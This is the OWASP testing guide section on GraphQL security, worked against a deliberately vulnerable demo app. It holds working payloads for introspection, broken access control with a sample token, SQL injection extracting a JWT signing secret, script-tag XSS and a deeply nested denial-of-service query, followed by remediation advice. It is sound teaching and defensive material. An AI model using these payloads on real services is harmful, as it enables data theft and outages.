# Testing GraphQL

|ID          |
|------------|
|WSTG-APIS-01|

## Summary

GraphQL has become very popular in modern APIs. It provides simplicity, and nested objects, which facilitate faster development. Every technology, while having advantages can also expose the application to new attack surfaces. The purpose of this scenario is to provide some common misconfigurations and attack vectors on applications which utilize GraphQL. Some vectors are unique to GraphQL (Introspection Query for example) and some are not (SQL Injection for example).

Examples in this section will be based on a vulnerable GraphQL application [poc-graphql](https://github.com/righettod/poc-graphql), which is run in a docker container which maps `localhost:8080/GraphQL` as the vulnerable GraphQL node.

## Test Objectives

Assess GraphQL's security configuration, as well as other common vulnerabilities which might affect GraphQL deployments.

## How to Test

Testing GraphQL nodes is not very different than testing other API technologies. Consider the following steps:

### Introspection Queries

Introspection queries are the way GraphQL lets you ask what queries are supported, which data types are available, and many more details you will need when approaching a test of a GraphQL deployment.

> "It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the [introspection](https://graphql.org/learn/introspection/) system!"

There are a couple of ways to extract that and visualize the output, as follows.

#### Using Native GraphQL Introspection

The most straight-forward way is to send an HTTP request (using a personal proxy) with the following payload, taken from an article on [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696) :

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

The result will usually be very long (and hence has been shortened here), and it will contain the entire schema of the GraphQL deployment.

Response:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

A tool such as GraphQL Voyager can be used to get a better understanding of the GraphQL endpoint:

![GraphQL Voyager](images/Voyager.png)\
_Figure 12.1-1: GraphQL Voyager_

This tool creates an Entity Relationship Diagram (ERD) representation of the GraphQL schema, allowing you to get a better look into the moving parts of the system you're testing. Extracting information from the drawing allows you to see you can query the dogs table for example. It also shows which properties a "dog" has:

- ID
- name
- veterinary (ID)  

There is one downside to using this method: GraphQL Voyager does not display everything that can be done with GraphQL, for example, in the drawing above the mutations available are not listed, so the best way would be to use both Voyager and one of the methods listed below.

#### Using GraphiQL

GraphiQL is a web-based IDE for GraphQL. It is part of the GraphQL project, and it is mainly used for debugging or development purposes. The best practice is to not allow users to access it on production deployments, however, if you are testing a staging environment you might have access to it and it can save you some time playing around with introspection queries (although you can, of course, use introspection in the GraphiQL interface).

GraphiQL has a docs section, which uses the data from the schema in order to created a documentation of the GraphQL instance that is being used. The documentation contains the data types, mutations, and basically every piece of information that can be extracted using Introspection.

#### Using GraphQL Playgrounds

GraphQL Playgrounds is a GraphQL client, which can be used to test different queries, as well as dividing GraphQL IDEs into different playgrounds, grouped by theme or by assigning a name to them. Much like GraphiQL, Playgrounds can create documentation for you, without the need for manually sending introspection queries and processing the response(s) but with one great advantage, it doesn't need GraphiQL interface to be available. Another upside for this tool, is that it works just by directing the tool to the GraphQL node via a URL (there is also the option of using it locally with the data file) and then the magic happens without any user interaction. GraphQL Playgrounds can be used to test for vulnerabilities directly, you don't need to use a personal proxy to send HTTP requests, and so you can use this tool in order to interact and asses GraphQL and use a personal proxy for other, more advanced payloads.  

> Note that in some cases you will need to set the HTTP headers at the bottom, to include session ID or other mechanism of authentication, but this still allows creating multiple "IDEs" with different permissions to verify if there are in fact authorization issues.

![Playgrounds1](images/Playgrounds1.png)\
_Figure 12.1-2: GraphQL Playgrounds High Level API Docs_

![Playgrounds2](images/Playgrounds2.png)\
_Figure 12.1-3: GraphQL Playgrounds API Schema_

You can even download the schemas to use in Voyager.

#### Introspection Conclusion

Introspection is a useful tool which allows users to gain more information about the GraphQL deployment, however, this will also allow malicious users to gain access to the same information. Best practice is to limit the access to the introspection queries, since, some tools or requests might fail if this feature is disabled altogether. Since GraphQL usually bridges to the backend APIs of the system, its better to enforce strict access control, which leads to the next topic.

### Authorization

Introspection is the first place to look for Authorization problems. As noted, introspection should be restricted since it allows for data extraction and data gathering. The next thing a tester should check, once they have access to the schema and know what sensitive information there is to extract, is sending queries which will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform authorization enforcement.

In the earlier examples the output of the introspection query, shows there is a query called `auth`, which seems like a good place to extract sensitive information (API tokens, passwords, etc).

![Auth GraphQL Query](images/auth1.png)\
_Figure 12.1-4: GraphQL Auth Query API_

Testing the authorization implementation varies from deployment to deployment since each schema will have different sensitive information, and hence, different targets to focus on. In this example, every user (even un-authenticated) can gain access to auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the schema allows, such as associating or disassociating a dog from any specified veterinarian (using mutations), while there is no matching of the auth token to the veterinarian which appears in the request. An example would be, to use the token that was extracted (which belongs to Julien), and use it to perform an action as Benoit, who has the number 2 ID.

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

And the response:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

All of the dogs in the list belong to Benoit and not to the veterinarian which sent the request (and owns the auth token).

### Injection

GraphQL is the implementation of the API layer of an application, and as such, it usually forwards the requests to a backend API or the database directly. This allows you to utilize any underlying vulnerability such as SQL injection, command injection, cross-site scripting, and basically, everything you expect to find in web applications, using GraphQL just changes the entry point of the malicious payload.

You can refer to other scenarios within the OWASP testing guide to get some ideas.

#### SQL Injection

The example application is vulnerable by design in the query `dogs(namePrefix: String, limit: Int = 500): [Dog!]`  since the parameter `namePrefix` is concatenated in the SQL query. Concatenating user input is a common malpractice of applications which exposes them to SQL injection.

The following query extracts information from the `CONFIG` table within the database:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

The response to this query is:

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

The query contains the secret which signs JWTs in the example application, which is very sensitive information. Please note that in order to know what to look for you will need to collect information and learn about how the application is built as well as how the database tables are organized. Another thing a tester can do, is use tools like sqlmap to look for injection paths, and even automate the extraction of data from the database.

#### Cross-Site Scripting (XSS)

Cross-Site scripting occurs when the browser treats data that should be displayed as code that should be executed, creating the opportunity to run malicious code in a user's browser. Reflection of input might cause XSS, but that is up to how the application is implemented, whether in encodes the output, so the best practice would be to test for XSS using a payload from [Testing for Reflected Cross Site Scripting](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md). As noted, GraphQL only creates another layer on top of the application, so other tests from WSTG might be useful.

In this example, errors might reflect the input at times, and in case the application reflects the errors to the users, XSS might occur.

Payload:

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Response:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

> Note: There are also scalars in GraphQL, which are usually used for custom data types which do not have native data types (DateTime for example). These types of data do not have out of the box validation as well, and you should look at them as well while testing.

### Abusive Queries

GraphQL exposes a very simple interface, to allow developers use nested queries and nested objects. This ability can also be used in a malicious way, by calling a deep nested query similar to a recursive function, causing a denial of service by using too much CPU, memory or other compute resources.

In the example application, a "dog" has a reference to a veterinary which also have a reference to a dog. This allows for a deep query which will overload the application:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

There a multiple security measures which can be implemented to prevent these types of queries, which will be listed in the remediation section. Abusive queries can cause issues like DoS for GraphQL deployments and hence, should be tested as part of a security test for GraphQL deployments.

### Detailed Error Message

GraphQL can encounter unexpected errors during runtime. When an error like that occurs, the server may send an error response, which can reveal internal error details or application configuration/data/assets, allowing a malicious user to acquire more information on the application. As part of the testing, error messages should be checked, by sending unexpected data, and the responses should be searched for additional information which might be revealed using this technique.

### Exposure of Underlying API

GraphQL is a new technology, and some deployments are for transitioning from old APIs to GraphQL. In many cases, this kind of deployment is to use GraphQL as a standard API which translates requests (sent using GraphQL syntax) to an underlying API, as well as the responses. If the requests are not properly checked, the path of parameters being passed, might be changed by the user. For example, a request contains an `id=1/delete` might translate to `/api/users/1/delete`, or a manipulation of other resources of that user. Also note that the request is now sent with the authorization of the GraphQL node, which is probably on higher privileges than a common user. A tester should try and gain access to other APIs using this method, and might be able to escalate privileges.

## Remediation

- Restrict access to introspection queries.
- Implement input validation.
  - It is the first measure that needs to be implemented to handle injections, specific methods will not be covered in this guide.
  - GraphQL does not have a native way to validate input, however, there is an open source project called ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) which allows for input validation as part of the schema definition.
  - Input validation alone will be good, but it will not block everything (there is no 100% security), and additional measures should be implemented as well.
- Implement security measures to prevent abusive queries.
  - Timeouts - Allows to stop queries which take too much time (and might be infinite).
  - Maximum query depth - Limits the depth of allowed queries, which might prevent queries which are too deep from abusing resources.
  - Maximum query complexity - Limits the complexity of queries, from abusing the GraphQL resources.
  - Throttling.
    - Server time based throttling - Limits the amount of server time a user can consume.
    - Query Complexity based throttling - Limits the total complexity of queries a user can consume.
- Sending generic error messages - Just like general programing, error messages should be generic without revealing details of the deployment.

## Tools

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Burp Extension)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (Burp Extension)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (Add-on for OWASP ZAP](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## References

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [GraphQL Official Site](https://graphql.org/learn/)
- [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)
- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
- [User side testing (XSS and other vulnerabilities)](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing)
- [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
